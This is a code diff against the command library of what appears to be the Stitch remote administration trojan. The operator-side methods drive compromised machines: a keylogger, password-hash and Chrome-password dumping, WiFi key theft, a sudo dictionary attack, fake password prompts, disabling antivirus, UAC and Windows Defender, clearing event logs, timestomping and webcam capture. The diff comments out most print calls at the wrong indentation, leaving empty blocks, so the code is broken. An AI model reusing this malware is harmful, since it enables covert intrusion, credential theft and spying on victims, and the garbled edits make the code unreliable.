@@ -74,40 +74,40 @@ class stitch_commands_library:
     # Filesystem utilities used by web interface
     def mkdir(self, args):
         if not args:
-            st_print('[*] Usage: mkdir [directory]')
+    # st_print('[*] Usage: mkdir [directory]')
             return
         if windows_client(system=self.cli_os):
             cmd = 'mkdir {}'.format(args)
         else:
             cmd = 'mkdir -p {}'.format(args)
         self.send(cmd)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def mv(self, args):
         if not args:
-            st_print('[*] Usage: mv [source] [destination]')
+    # st_print('[*] Usage: mv [source] [destination]')
             return
         if windows_client(system=self.cli_os):
             cmd = 'move {}'.format(args)
         else:
             cmd = 'mv {}'.format(args)
         self.send(cmd)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def rm(self, args):
         if not args:
-            st_print('[*] Usage: rm [path]')
+    # st_print('[*] Usage: rm [path]')
             return
         if windows_client(system=self.cli_os):
             cmd = 'del /F /Q {}'.format(args)
         else:
             cmd = 'rm -rf {}'.format(args)
         self.send(cmd)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def timestomp(self, mode, file_path):
         if not file_path:
-            st_print('[*] Usage: timestomp [a|c|m] [file]')
+    # st_print('[*] Usage: timestomp [a|c|m] [file]')
             return
         if mode == 'a':
             self.editaccessed(file_path)
@@ -116,7 +116,7 @@ class stitch_commands_library:
         elif mode == 'm':
             self.editmodified(file_path)
         else:
-            st_print('[!] Unknown timestomp mode. Use a/c/m')
+    # st_print('[!] Unknown timestomp mode. Use a/c/m')
 
     def history_check(self):
         self.Config = ConfigParser.ConfigParser()
@@ -140,7 +140,7 @@ class stitch_commands_library:
                 self.send('echo hello')
                 self.receive()
             except Exception as e:
-                st_print("[!] Connection has been lost.")
+    # st_print("[!] Connection has been lost.")
                 st_log.error('Exception:\n{}'.format(str(e)))
                 return False
         return True
@@ -154,18 +154,18 @@ class stitch_commands_library:
 ################################################################################
 
     def avscan(self):
-        st_print("=== Antivirus Scan ===")
+    # st_print("=== Antivirus Scan ===")
         if windows_client(system=self.cli_os):
             self.pyexec('avscan_win.py',pylib=True)
-            st_print("    {}".format(self.receive()))
-            st_print("    {}".format(self.receive()))
+    # st_print("    {}".format(self.receive()))
+    # st_print("    {}".format(self.receive()))
         else:
             self.pyexec('avscan_posix.py',pylib=True)
-            st_print("    {}".format(self.receive()))
+    # st_print("    {}".format(self.receive()))
 
     def avkill(self):
         self.pyexec('avkiller.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def cat(self, f_name):
         self.pyexec('cat.py',pylib=True)
@@ -174,16 +174,16 @@ class stitch_commands_library:
         response=self.receive()
         if no_error(response):
             response=self.receive()
-            print('\n{}'.format(response))
+    # print('\n{}'.format(response))
             while response != st_complete.decode('utf-8'):
                 response=self.receive()
                 if response != st_complete.decode('utf-8'):
-                    print('\b')+ response,
+    # print('\b')+ response,
                 else:
-                    print("\n")
+    # print("\n")
                     break
         else:
-            st_print(response)
+    # st_print(response)
 
     def cd(self, path):
         if path:
@@ -191,50 +191,50 @@ class stitch_commands_library:
             self.send(path)
             response=self.receive()
             if not no_error(response):
-                st_print(response)
+    # st_print(response)
             else:
                 pass
             self.pwd()
 
     def clear(self):
         clear_screen()
-        st_print('[+] Current Session: {}\n\n'.format(self.cli_target))
+    # st_print('[+] Current Session: {}\n\n'.format(self.cli_target))
 
     def crackpassword(self):
         with open(os.path.join(tools_path, 'passwords.txt'),'r') as pw:
             password_list = pw.readlines()
         cracked = False
         self.pyexec('crackpassword.py',pylib=True)
-        st_print('[*] Attempting to crack the sudo password...')
+    # st_print('[*] Attempting to crack the sudo password...')
         for n in password_list:
             n = n.strip()
             resp = self.receive()
             if 'sudo_failed' in resp:
-                st_print('[*] Currently running with sudo privileges, unable to start dictionary attack.\n')
+    # st_print('[*] Currently running with sudo privileges, unable to start dictionary attack.\n')
                 return
             if 'sudo_success' in resp:
                 self.send(n)
                 resp = self.receive()
                 if 'password_failed' in resp:
-                    st_print('[-] {}'.format(n))
+    # st_print('[-] {}'.format(n))
                 if 'password_cracked' in resp:
-                    st_print('[+] Password: {}'.format(n))
+    # st_print('[+] Password: {}'.format(n))
                     st_logger(n,self.cli_dwld,'sudo_password')
                     cracked = True
                     break
         if not cracked:
             resp = self.receive()
             self.send('password_list_failed')
-            st_print('[!] Failed to crack the sudo password.\n')
+    # st_print('[!] Failed to crack the sudo password.\n')
 
 
     def displayoff(self):
         self.pyexec('displayoff.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def displayon(self):
         self.pyexec('displayon.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def download(self, f_name):
         self.pyexec('download.py',pylib=True)
@@ -245,7 +245,7 @@ class stitch_commands_library:
         if not os.path.exists(self.cli_dwld):
             os.mkdir(self.cli_dwld)
         if len(dwld) > 0:
-            st_print('[*] Beginning download of {}...'.format(f_name))
+    # st_print('[*] Beginning download of {}...'.format(f_name))
             if f_name.endswith('\\') or f_name.endswith('/'):
                 d_file = f_name[:-1]
                 d_file = os.path.basename(d_file)
@@ -277,36 +277,36 @@ class stitch_commands_library:
                             d = self.receive(as_string=False)
                             if not no_error(d):
                                 self.send('exit')
-                                st_print('[!] %s\n' %d)
+    # st_print('[!] %s\n' %d)
                                 return
                             download_bar.increment()
                             if d != b'download complete':
                                 my_download.write(d)
                             else:
                                 download_bar.complete()
-                    st_print("[+] Download succesful: %s\n" % downld)
+    # st_print("[+] Download succesful: %s\n" % downld)
                 else:
-                    st_print('[!] Size of "{}" is not a valid int'.format(size))
+    # st_print('[!] Size of "{}" is not a valid int'.format(size))
             else:
-                st_print(size)
+    # st_print(size)
         else:
-            st_print('[*] Download usage: [download] [filepath]\n')
+    # st_print('[*] Download usage: [download] [filepath]\n')
 
     def environment(self):
         self.pyexec('environment.py',pylib=True)
-        st_print("=== System Environment Variables ===")
-        st_print(self.receive())
+    # st_print("=== System Environment Variables ===")
+    # st_print(self.receive())
 
     def fileinfo(self, f_name):
         if f_name:
             self.pyexec('fileinfo.py',pylib=True)
             self.send(f_name)
-            st_print(self.receive())
+    # st_print(self.receive())
 
     def firewall(self, option):
         if option == 'status':
             self.pyexec('fwstatus.py',pylib=True)
-            st_print(self.receive())
+    # st_print(self.receive())
         elif option == 'open':
             try:
                 while True:
@@ -318,14 +318,14 @@ class stitch_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print('\n')
+    # print('\n')
                 return
             if windows_client(self.cli_os):
                 cmd = 'netsh advfirewall firewall add rule name="NetBios Port {} {}" dir={} action=allow protocol={} localport={}'.format(port,direction,direction,proto,port)
             if osx_client(self.cli_os):
                 cmd = "sed -i '' -e '$a\\pass in proto {} from any to any port = {}' /etc/pf.conf; pfctl -vnf /etc/pf.conf".format(proto,port)
             self.send(cmd)
-            st_print(self.receive())
+    # st_print(self.receive())
         elif option == 'close':
             try:
                 while True:
@@ -337,14 +337,14 @@ class stitch_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print('\n')
+    # print('\n')
                 return
             if windows_client(self.cli_os):
                 cmd = 'netsh advfirewall firewall delete rule name="NetBios Port {} {}" protocol={} localport={}'.format(port, direction,proto,port)
             if osx_client(self.cli_os):
                 cmd = 'pfctl -sr 2>/dev/null | fgrep -v "block drop quick proto {} from any to any port = {}") | pfctl -f - '.format(proto,port)
             self.send(cmd)
-            st_print(self.receive())
+    # st_print(self.receive())
         elif option == "allow" and windows_client(self.cli_os):
             try:
                 while True:
@@ -354,12 +354,12 @@ class stitch_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print('\n')
+    # print('\n')
                 return
             self.pyexec('fwallow.py',pylib=True)
             self.send(prog)
             self.send(rulename)
-            st_print(self.receive())
+    # st_print(self.receive())
         else:
             usage_firewall()
 
@@ -368,22 +368,22 @@ class stitch_commands_library:
             self.pyexec('hashdump.py',pylib=True)
             resp = self.receive()
             if no_error(resp):
-                st_print(resp)
-                st_print(self.receive())
-                st_print(self.receive())
+    # st_print(resp)
+    # st_print(self.receive())
+    # st_print(self.receive())
             else:
-                st_print(resp)
+    # st_print(resp)
         if osx_client(system=self.cli_os):
             self.pyexec('hashdump.py',pylib=True)
             resp = self.receive()
-            st_print(resp)
+    # st_print(resp)
         if linux_client(system=self.cli_os):
             self.pyexec('hashdump.py',pylib=True)
             resp = self.receive()
-            st_print(resp)
+    # st_print(resp)
             if no_error(resp):
                 resp = self.receive()
-                st_print(resp)
+    # st_print(resp)
         if no_error(resp):
             st_logger(resp,self.cli_dwld,'hashdump')
 
@@ -391,7 +391,7 @@ class stitch_commands_library:
         if line:
             self.pyexec('hide.py',pylib=True)
             self.send(line)
-            st_print(self.receive())
+    # st_print(self.receive())
         else:
             usage_hide()
 
@@ -405,12 +405,12 @@ class stitch_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print('\n')
+    # print('\n')
                 return
             self.pyexec('hostsupdate.py',pylib=True)
             self.send(hostname)
             self.send(ipaddress)
-            st_print(self.receive())
+    # st_print(self.receive())
         elif option == 'remove':
             try:
                 while True:
@@ -419,11 +419,11 @@ class stitch_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print('\n')
+    # print('\n')
                 return
             self.pyexec('hostsremove.py',pylib=True)
             self.send(hostname)
-            st_print(self.receive())
+    # st_print(self.receive())
         elif option == 'show':
             self.cat(self.cli_hosts_file)
         else:
@@ -435,7 +435,7 @@ class stitch_commands_library:
         else:
             cmd = 'ifconfig {}'.format(args)
         self.send(cmd)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def ipconfig(self, args):
         self.ifconfig(args)
@@ -443,30 +443,30 @@ class stitch_commands_library:
     def keylogger(self, option):
         if option == 'start':
             self.pyexec('kl_start.py',pylib=True)
-            st_print(self.receive())
+    # st_print(self.receive())
         elif option == 'stop':
             self.pyexec('kl_stop.py',pylib=True)
-            st_print(self.receive())
+    # st_print(self.receive())
         elif option == 'dump':
             self.pyexec('kl_dump.py',pylib=True)
             resp = self.receive()
-            st_print(resp)
+    # st_print(resp)
             if not resp.startswith('[*]'):
                 st_logger(resp,self.cli_dwld,'keylogger')
         elif option == 'status':
             self.pyexec('kl_status.py',pylib=True)
-            st_print(self.receive())
+    # st_print(self.receive())
         else:
             usage_keylogger()
 
     def location(self):
         self.pyexec('location.py',pylib=True)
-        st_print('=== Location ===')
-        st_print(self.receive())
+    # st_print('=== Location ===')
+    # st_print(self.receive())
 
     def lockscreen(self):
         self.pyexec('lockscreen.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def ls(self, args):
         if windows_client(system=self.cli_os):
@@ -474,7 +474,7 @@ class stitch_commands_library:
         else:
             cmd = 'ls -alh {}'.format(args)
         self.send(cmd)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def lsmod(self, args):
         if windows_client(system=self.cli_os):
@@ -484,7 +484,7 @@ class stitch_commands_library:
         elif osx_client(system=self.cli_os):
             cmd = 'kextstat {}'.format(args)
         self.send(cmd)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def more(self, args):
         if args:
@@ -500,18 +500,18 @@ class stitch_commands_library:
                 if correct.lower().startswith('y'):
                     break
         except KeyboardInterrupt:
-            print('\n')
+    # print('\n')
             return
         self.pyexec('popup.py',pylib=True)
         self.send(message)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def pwd(self):
         if windows_client(system=self.cli_os):
             self.send('cd')
         else:
             self.send('pwd')
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def ps(self,args):
         if windows_client(system=self.cli_os):
@@ -519,7 +519,7 @@ class stitch_commands_library:
         else:
             cmd = 'ps {}'.format(args)
         self.send(cmd)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def pyexec(self, f_name, pylib=False):
         code = ''
@@ -534,7 +534,7 @@ class stitch_commands_library:
                 py_file_path = os.path.join(uploads_path,py_file)
             if os.path.exists(py_file_path):
                 if not py_file.endswith('.py') or os.path.isdir(py_file_path):
-                    st_print("[!] Only Python scripts located in %s can use pyexec.\n" %(dir_path))
+    # st_print("[!] Only Python scripts located in %s can use pyexec.\n" %(dir_path))
                     return
                 with open(py_file_path,'rb') as c:
                     for line in c.readlines():
@@ -545,15 +545,15 @@ class stitch_commands_library:
                     self.send('pylib'+ code)
                 else:
                     self.send('pyexec'+ code)
-                    st_print(self.receive())
+    # st_print(self.receive())
             else:
-                st_print('[!] %s is not located in %s.\n' % (py_file,dir_path))
+    # st_print('[!] %s is not located in %s.\n' % (py_file,dir_path))
         else:
-            st_print('[!] File name is required.\n')
+    # st_print('[!] File name is required.\n')
 
     def screenshot(self):
         self.pyexec('screenshot.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
         sc = os.path.join(self.cli_temp,'fs.jpg')
         self.download(sc)
         if windows_client(system=self.cli_os):
@@ -565,8 +565,8 @@ class stitch_commands_library:
 
     def sysinfo(self):
         self.pyexec('sysinfo.py',pylib=True)
-        st_print('=== System info ===')
-        st_print(self.receive())
+    # st_print('=== System info ===')
+    # st_print(self.receive())
 
     def touch(self, f_name):
         if windows_client(system=self.cli_os):
@@ -574,13 +574,13 @@ class stitch_commands_library:
         else:
             cmd = 'touch {}'.format(f_name)
         self.send(cmd)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def unhide(self,line):
         if line:
             self.pyexec('unhide.py',pylib=True)
             self.send(line)
-            st_print(self.receive())
+    # st_print(self.receive())
         else:
             usage_unhide()
 
@@ -610,7 +610,7 @@ class stitch_commands_library:
                     zipf = zipfile.ZipFile(u_zip_path, 'w', zipfile.ZIP_DEFLATED)
                     zipf.write(u_file)
                     zipf.close()
-                st_print("[*] Beginning upload of {}...".format(u_file))
+    # st_print("[*] Beginning upload of {}...".format(u_file))
                 size =os.stat(u_zip_path)
                 size = size.st_size
                 upload_bar = progress_bar(size)
@@ -624,14 +624,14 @@ class stitch_commands_library:
                 upload_bar.complete()
                 self.send('upload complete')
                 os.remove(u_zip_path)
-                st_print(self.receive())
+    # st_print(self.receive())
             else:
-                st_print('[!] {} is not located in {}.\n'.format(u_file,uploads_path))
+    # st_print('[!] {} is not located in {}.\n'.format(u_file,uploads_path))
                 self.send("ERROR")
 
     def vmscan(self):
         self.pyexec('vmscan.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def webcamsnap(self, cam_dev):
         self.pyexec('webcamSnap.py',pylib=True)
@@ -650,7 +650,7 @@ class stitch_commands_library:
                 os.remove(os.path.join(uploads_path,'.st_imsnp'))
         resp = self.receive()
         if no_error(resp):
-            st_print(resp)
+    # st_print(resp)
             sc = os.path.join(self.cli_temp,'wb.jpg')
             self.download(sc)
             if windows_client(system=self.cli_os):
@@ -660,24 +660,24 @@ class stitch_commands_library:
             self.send(cmd)
             self.receive()
         else:
-            st_print(resp)
+    # st_print(resp)
 
     def webcamlist(self):
         self.pyexec('webcamList.py',pylib=True)
         resp = self.receive()
         if windows_client(system=self.cli_os):
-            st_print(resp)
+    # st_print(resp)
             if no_error(resp):
-                st_print(self.receive())
+    # st_print(self.receive())
         else:
             if resp == 'upload_imgsnap':
                 shutil.copy(imagesnap,os.path.join(uploads_path,'.st_imsnp'))
                 self.upload('.st_imsnp', to_cwd=False)
                 os.remove(os.path.join(uploads_path,'.st_imsnp'))
             resp = self.receive()
-            st_print(resp)
+    # st_print(resp)
             if no_error(resp):
-                st_print(self.receive())
+    # st_print(self.receive())
 
 ################################################################################
 #                        Start of DISCONNECT Section                           #
@@ -685,7 +685,7 @@ class stitch_commands_library:
 
     def exit(self, alive=True):
         if alive: self.send("end_connection")
-        st_print("[-] Disconnected from {}\n".format(self.cli_target))
+    # st_print("[-] Disconnected from {}\n".format(self.cli_target))
         self.client.close()
         return True
 
@@ -700,7 +700,7 @@ class stitch_commands_library:
         resp = input("\nAre you sure you want to clear the System, Security, and Application event logs? [Y/N]: ")
         if resp.lower().startswith('y'):
             self.pyexec('clearev.py',pylib=True)
-            st_print(self.receive())
+    # st_print(self.receive())
         else:
             print
 
@@ -739,27 +739,27 @@ class stitch_commands_library:
                             os.remove(zip_loc)
                             os.remove(chrome_path)
                             if (e == 'database is locked'):
-                                st_print('[!] Make sure Google Chrome is not running in the background')
+    # st_print('[!] Make sure Google Chrome is not running in the background')
                             elif (e == 'no such table: logins'):
-                                st_print('[!] Something is wrong with the database name')
+    # st_print('[!] Something is wrong with the database name')
                             elif (e == 'unable to open database file'):
-                                st_print('[!] Something is wrong with the database path')
+    # st_print('[!] Something is wrong with the database path')
                             else:
-                                st_print(e)
+    # st_print(e)
                     connection.close()
                     os.remove(zip_loc)
                     os.remove(chrome_path)
-                    st_print('=== Chrome Password Dump ===')
-                    st_print(info_list)
+    # st_print('=== Chrome Password Dump ===')
+    # st_print(info_list)
                     st_logger(info_list,self.cli_dwld,'chromedump')
             else:
-                st_print(resp)
+    # st_print(resp)
         else:
-            st_print('[*] Must be running Stitch on a windows machine to use this function.\n')
+    # st_print('[*] Must be running Stitch on a windows machine to use this function.\n')
 
     def drives(self):
         self.pyexec('drive_finder.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def editaccessed(self, f_name):
         if f_name:
@@ -771,12 +771,12 @@ class stitch_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print('\n')
+    # print('\n')
                 return
             self.pyexec('editAccessed.py',pylib=True)
             self.send(editfile)
             self.send(edittime)
-            st_print(self.receive())
+    # st_print(self.receive())
         else:
             usage_editaccessed()
 
@@ -790,12 +790,12 @@ class stitch_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print('\n')
+    # print('\n')
                 return
             self.pyexec('editCreation.py',pylib=True)
             self.send(editfile)
             self.send(edittime)
-            st_print(self.receive())
+    # st_print(self.receive())
         else:
             usage_editcreated()
 
@@ -809,62 +809,62 @@ class stitch_commands_library:
                     if correct.lower().startswith('y'):
                         break
             except KeyboardInterrupt:
-                print('\n')
+    # print('\n')
                 return
             self.pyexec('editModified.py',pylib=True)
             self.send(editfile)
             self.send(edittime)
-            st_print(self.receive())
+    # st_print(self.receive())
         else:
             usage_editmodified()
 
     def enableRDP(self):
         self.pyexec('enableRDP.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def enableUAC(self):
         self.pyexec('enableUAC.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def enableWindef(self):
         self.pyexec('enableWinDef.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def freeze(self, option):
         if option == 'start':
             self.pyexec('freeze_start.py',pylib=True)
-            st_print(self.receive())
+    # st_print(self.receive())
         elif option == 'stop':
             self.pyexec('freeze_stop.py',pylib=True)
-            st_print(self.receive())
+    # st_print(self.receive())
         elif option == 'status':
             self.pyexec('freeze_status.py',pylib=True)
-            st_print(self.receive())
+    # st_print(self.receive())
         else:
             usage_freeze()
 
     def disableRDP(self):
         self.pyexec('disableRDP.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def disableUAC(self):
         self.pyexec('disableUAC.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def disableWindef(self):
         self.pyexec('disableWinDef.py',pylib=True)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def scanreg(self):
         self.pyexec('scanReg.py',pylib=True)
-        st_print('=== Registry Scan ===')
-        st_print(self.receive())
+    # st_print('=== Registry Scan ===')
+    # st_print(self.receive())
 
     def wifikeys(self):
         self.pyexec('wifikeys.py',pylib=True)
-        st_print('=== System Wifi Keys ===')
+    # st_print('=== System Wifi Keys ===')
         keys = self.receive()
-        st_print(keys)
+    # st_print(keys)
         st_logger(keys,self.cli_dwld,'wifikeys')
 
 ################################################################################
@@ -873,30 +873,30 @@ class stitch_commands_library:
 
     def askpassword(self):
         self.pyexec('askpass.py',pylib=True)
-        st_print("[*] Waiting for the user's response...")
+    # st_print("[*] Waiting for the user's response...")
         resp = self.receive()
-        st_print(resp)
+    # st_print(resp)
         st_logger(resp,self.cli_dwld,'askpassword')
 
     def logintext(self):
         text = input("Enter text to be displayed on login window: ")
         cmd = "defaults write /Library/Preferences/com.apple.loginwindow LoginwindowText \"{}\"".format(text)
         self.send(cmd)
-        st_print(self.receive())
+    # st_print(self.receive())
 
     def ssh(self):
         try:
             ssh_host = input("\nPlease enter ssh hostname: ")
             if 'exit' in ssh_host:
-                print('\n')
+    # print('\n')
                 return
             ssh_user = input("\nPlease enter ssh user: ")
             if 'exit' in ssh_user:
-                print('\n')
+    # print('\n')
                 return
             ssh_pass = getpass("\nPlease enter password for {}: ".format(ssh_user))
         except KeyboardInterrupt:
-            print('\n')
+    # print('\n')
             return
 
         self.pyexec('ssh.py',pylib=True)
@@ -913,9 +913,9 @@ class stitch_commands_library:
                 else:
                     self.send(ssh_cmd)
                     if ssh_cmd == 'exit': break
-                    st_print(self.receive())
+    # st_print(self.receive())
         else:
-            st_print('{}\n'.format(prompt))
+    # st_print('{}\n'.format(prompt))
 
     def sudo(self, line):
         self.pyexec('sudo_cmd.py',pylib=True)
@@ -929,7 +929,7 @@ class stitch_commands_library:
                 su_pass = getpass("\nSorry incorrect\nPlease enter sudo password:")
                 self.send(su_pass)
             if resp == 'sudo: 3 incorrect password attempts':
-                st_print('sudo: 3 incorrect password attempts\n')
+    # st_print('sudo: 3 incorrect password attempts\n')
                 return
             resp = self.receive()
-        st_print(self.receive())
+    # st_print(self.receive())
